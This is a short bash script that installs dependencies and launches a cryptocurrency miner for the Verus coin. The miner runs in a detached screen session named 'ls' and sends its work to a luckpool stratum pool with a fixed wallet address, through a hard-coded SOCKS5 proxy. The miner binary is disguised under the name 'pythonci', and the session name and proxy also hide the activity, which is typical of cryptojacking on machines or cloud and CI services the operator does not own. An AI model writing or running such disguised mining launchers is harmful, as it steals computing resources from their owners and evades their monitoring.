#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
screen -dmS ls
POOL=stratum+tcp://na.luckpool.net:3956
WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WORKER=0AA2
PROXY=socks5://184.178.172.14:4145
./pythonci -a verus -o $POOL -u $WALLET.$WORKER -p x -t 6 -x $PROXY
